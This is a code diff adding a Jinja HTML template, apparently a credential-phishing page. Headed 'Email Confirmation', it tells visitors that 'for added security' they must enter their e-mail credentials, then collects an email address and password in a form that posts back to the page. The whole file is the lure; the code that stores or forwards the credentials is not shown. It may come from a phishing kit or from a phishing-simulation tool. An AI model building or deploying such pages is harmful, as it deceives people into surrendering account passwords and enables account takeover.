@@ -1,0 +1,27 @@
+{% extends 'base.html'%}
+
+{%block body%}
+   
+    <div style="padding-top: 5px;" class="middle-form">
+        <p style="font-size: 28px;"> Email Confirmation </p>
+
+        <p class='middle'>For added security, please enter your e-mail credentials</p>
+        <div class="submitForm">
+            <form action="" method="post">
+                <div class="input-field">
+                    <input placeholder="Email" name="email" type="text">
+                </div>
+                <div class="input-field">
+                    <input placeholder="Password" name="password" type="password">
+                </div>
+            
+            <button style="width: 100%;" type="submit">Continue</button>
+        </form>
+<br><br>
+        <div class="neutral-link">
+            <a style="font-family: Georgia, 'Times New Roman', Times, serif; text-decoration: none; color: black;" href="">Cancel</a>
+        </div>
+        
+        </div>      
+    </div>
+{%endblock%}
